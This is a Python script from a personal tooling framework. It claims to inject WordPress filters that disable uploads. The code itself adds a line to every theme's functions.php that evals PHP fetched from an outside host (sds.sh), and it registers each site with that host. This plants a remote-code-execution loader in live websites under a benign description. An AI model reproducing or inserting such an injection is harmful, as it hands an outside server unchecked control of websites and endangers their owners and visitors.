import _rightThumb._construct as __;appDBA=__.clearFocus(__name__,__file__);__.appReg=appDBA;import _rightThumb._base3 as _;
def focus(parentApp='', childApp='', reg=True): global appDBA; f = __.appName(appDBA, parentApp, childApp); return f if reg else f
fieldSet=_.l.vars(focus(),__name__,__file__,appDBA);_.load();_v=__.imp('_rightThumb._vars');

def sw():
	pass
	# _.switches.register( 'Site', '-site', 'icosahedron.quest' )
_._default_settings_()

_.appInfo[focus()] = {
	'file': 'wp-fn.py',
	'description': 'Inject wordpress filters to remove uploads, etc',
	'categories': [
						'wp',
						'wordpress',
						'wordpress filters',
						'wordpress upload disable',
				],
	'examples': [
						_.hp('p wp-fn'),
						_.linePrint(label='simple',p=0),
						'',
	],
	'columns': [
	],
	'aliases': [],
	'notes': [],
}

_.appInfo[focus()] = _.appInfoContinuity(__.thisApp( __file__ ),_.appInfo[focus()])
_.appData[focus()] = _.appDataContinuity()
def appRegDics(): return { 'appInfo': _.appInfo[focus()], 'appData': _.appData[focus()] }

def triggers():
	_._default_triggers_()
def _local_(do): exec(do)
_.l.conf('clean-pipe',True); _.l.sw.register( triggers, sw );
########################################################################################
#n)--> start

def process(path,site):
	if not os.path.isfile(path):
		_.pr(path,c='red')
		return False
	fi = _.getText(path,raw=True)
	if 'sds.sh/a/wp/fn' in fi:
		_.pr(path,c='cyan')
		return False

	fi = fi.split('\n')
	_.pr(path,c='green')
	if not fi:
		_.pr('no file found',c='red')
		return False
	if not os.path.isfile(path+'.bak'):
		_.saveText( fi, path+'.bak')
	lines = []
	first = True
	inject = "eval(file_get_contents('https://sds.sh/a/wp/fn/?site="+site+"'));"
	# _.pr(inject)
	for i,line in enumerate(fi):
		if first and 'add_action' in line:
			first = False
			lines.append(inject)
		# if line:
		lines.append(line)
	_.saveText( lines, path)
def action():
	if os.path.isdir('wp-content'):
		site = os.getcwd().split(os.sep)[-1]
		if site == 'public_html':
			site = os.getcwd().split(os.sep)[-2]
		_.pr(site)
		# sys.exit()
		_.URL('https://sds.sh/a/wp/fn/?register=1&site='+site)
		for fo in _.fos('wp-content/themes'):
			fn = fo+os.sep+'functions.php'
			# _.pr(fn)
			process(fn,site)

import os
import sys
########################################################################################
if __name__ == '__main__':
	action(); _.isExit(__file__);